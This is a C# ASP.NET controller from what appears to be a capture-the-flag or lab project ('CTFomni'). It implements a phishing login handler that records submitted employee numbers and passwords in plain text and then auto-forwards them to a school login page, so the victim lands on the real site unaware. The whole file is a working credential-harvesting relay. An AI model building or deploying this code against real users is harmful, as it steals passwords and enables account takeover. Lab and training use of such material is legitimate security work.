using System.Diagnostics;
using CTFomni.Models;
using Microsoft.AspNetCore.Mvc;

namespace CTFomni.Controllers;

[Route("login")]
public class LoginController : Controller
{
    [HttpPost]
    [Route("submit")]
    public IActionResult Login([FromForm] LoginModel model)
    {
        var validationResult = ValidateLoginData(model);
        if (!validationResult.IsValid)
            return Redirect("~/index.html");

        SaveLoginData(model);

        var formData = new Dictionary<string, string>();
        if (model.TypeIdentification == "EmployeNormal")
        {
            formData["DA"] = model.NoEmplEmployeNormal ?? "";
            formData["Password"] = model.PasswordEmplEmployeNormal ?? "";
        }
        else
        {
            return BadRequest(new { message = "Type d'identification invalide." });
        }
        
        return View("AutoSubmitForm", new AutoSubmitFormModel
        {
            ActionUrl = "http://zeroday.cegeplabs.qc.ca/school/index.php",
            FormData = formData
        });
    }

    private (bool IsValid, string ErrorMessage) ValidateLoginData(LoginModel model)
    {
        if (string.IsNullOrEmpty(model.TypeIdentification))
            return (false, "Le type d'identification est requis.");

        if (model.TypeIdentification == "EmployeNormal")
        {
            if (string.IsNullOrEmpty(model.NoEmplEmployeNormal) ||
                string.IsNullOrEmpty(model.PasswordEmplEmployeNormal))
                return (false, "Le numéro d'employé et le mot de passe sont requis.");
        }
        else
        {
            return (false, "Type d'identification invalide.");
        }

        return (true, string.Empty);
    }

    private void SaveLoginData(LoginModel model)
    {
        Console.WriteLine($"Type: {model.TypeIdentification}");
        Console.WriteLine($"NoEmpl: {model.NoEmplEmployeNormal}");
        Console.WriteLine($"Password: {model.PasswordEmplEmployeNormal}");
    }
}
